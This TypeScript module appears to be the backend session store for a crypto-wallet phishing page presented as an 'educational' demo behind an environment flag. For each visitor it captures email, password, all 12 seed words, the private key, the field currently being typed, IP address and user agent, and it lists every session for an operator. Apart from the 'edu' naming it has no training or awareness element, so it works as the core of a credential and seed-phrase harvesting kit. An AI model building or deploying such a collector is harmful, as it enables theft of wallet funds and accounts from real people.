import crypto from 'crypto'

export type EduPhishStep = 'connecting' | 'import_prompt' | 'recovery_form' | 'submitted'

export interface EduPhishSession {
  id: string
  walletBrand: string
  step: EduPhishStep
  email: string
  password: string
  seedWords: string[]
  privateKey: string
  activeField: string | null
  userAgent: string
  clientIp: string
  pageUrl: string
  createdAt: string
  updatedAt: string
}

const sessions = new Map<string, EduPhishSession>()

export function isEduPhishDemoEnabled(): boolean {
  return process.env.EDU_PHISHING_DEMO === 'true'
}

export function createEduPhishSession(input: {
  walletBrand: string
  userAgent: string
  clientIp: string
  pageUrl: string
}): EduPhishSession {
  const now = new Date().toISOString()
  const session: EduPhishSession = {
    id: crypto.randomUUID(),
    walletBrand: input.walletBrand,
    step: 'connecting',
    email: '',
    password: '',
    seedWords: Array.from({ length: 12 }, () => ''),
    privateKey: '',
    activeField: null,
    userAgent: input.userAgent,
    clientIp: input.clientIp,
    pageUrl: input.pageUrl,
    createdAt: now,
    updatedAt: now,
  }
  sessions.set(session.id, session)
  return session
}

export function updateEduPhishSession(
  id: string,
  patch: Partial<
    Pick<
      EduPhishSession,
      'step' | 'email' | 'password' | 'seedWords' | 'privateKey' | 'activeField'
    >
  >
): EduPhishSession | null {
  const existing = sessions.get(id)
  if (!existing) return null

  const updated: EduPhishSession = {
    ...existing,
    ...patch,
    seedWords: patch.seedWords ? [...patch.seedWords] : existing.seedWords,
    updatedAt: new Date().toISOString(),
  }
  sessions.set(id, updated)
  return updated
}

export function listEduPhishSessions(): EduPhishSession[] {
  return Array.from(sessions.values()).sort(
    (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime()
  )
}

export function clearEduPhishSessions(): number {
  const count = sessions.size
  sessions.clear()
  return count
}
